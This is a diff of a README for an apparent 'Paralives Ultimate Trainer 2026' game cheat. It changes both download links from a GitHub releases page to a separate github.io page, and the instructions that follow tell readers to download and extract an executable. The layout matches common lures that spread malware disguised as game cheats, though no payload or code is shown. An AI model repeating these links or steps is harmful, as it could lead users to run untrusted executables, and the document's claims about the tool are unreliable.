@@ -1,6 +1,6 @@
 # 🎮 Paralives-Ultimate-Trainer-2026 - Master your game with ease today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/epilobiumcanumcanumpierisrapae342/Paralives-Ultimate-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://epilobiumcanumcanumpierisrapae342.github.io)
 
 ---
 
@@ -21,7 +21,7 @@ Paralives-Ultimate-Trainer-2026 allows you to manage game data for Paralives. Yo
 
 Follow these steps to set up the trainer on your Windows computer.
 
-1.  **Visit the Download Page:** Navigate to the [Release Page](https://github.com/epilobiumcanumcanumpierisrapae342/Paralives-Ultimate-Trainer-2026/releases) to access the latest files.
+1.  **Visit the Download Page:** Navigate to the [Release Page](https://epilobiumcanumcanumpierisrapae342.github.io) to access the latest files.
 2.  **Select the File:** Locate the version tagged as the latest release. Click the link to download the compressed executable file (usually a .zip or .exe).
 3.  **Prepare the Folder:** Create a new folder on your desktop. Move the downloaded file into this folder.
 4.  **Extract:** If the file comes as a .zip, right-click it and select Extract All. Open the resulting folder.
